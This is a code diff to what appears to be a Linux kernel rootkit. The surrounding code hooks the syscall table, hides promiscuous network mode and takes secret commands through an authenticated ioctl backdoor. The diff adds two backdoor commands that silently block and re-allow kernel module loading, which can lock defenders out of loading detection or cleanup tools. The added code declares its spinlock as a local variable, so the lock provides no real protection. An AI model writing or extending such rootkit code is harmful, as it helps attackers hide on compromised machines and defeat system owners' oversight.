@@ -46,6 +46,7 @@ unsigned long *sys_call_table;
 unsigned long *ia32_sys_call_table;
 
 unsigned int hide_promisc = 0;
+unsigned int module_loading_disabled = 0;
 
 struct s_proc_args {
     unsigned short pid;
@@ -615,7 +616,9 @@ unsigned int n_dev_get_flags ( const struct net_device *dev )
 static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long arg )
 {
     int ret;
+    unsigned long flags;
     struct s_args args;
+    DEFINE_SPINLOCK(spinlock);
 
     if ( cmd == AUTH_TOKEN )
     {
@@ -883,6 +886,38 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
                     if ( modules_disabled )
                         *modules_disabled = 0;
                 }
+                break;
+
+            /* Silently prohibit module loading */
+            case 16:
+                DEBUG("Silently prohibiting module loading\n");
+
+                spin_lock_irqsave(&spinlock, flags);
+
+                if ( ! module_loading_disabled )
+                {
+                    module_loading_disabled = 1;
+                    disable_module_loading();
+                }
+
+                spin_unlock_irqrestore(&spinlock, flags);
+
+                break;
+
+            /* Silently re-permit module loading */
+            case 17:
+                DEBUG("Silently re-permitting module loading\n");
+
+                spin_lock_irqsave(&spinlock, flags);
+
+                if ( module_loading_disabled )
+                {
+                    enable_module_loading();
+                    module_loading_disabled = 0;
+                }
+
+                spin_unlock_irqrestore(&spinlock, flags);
+
                 break;
 
             default:
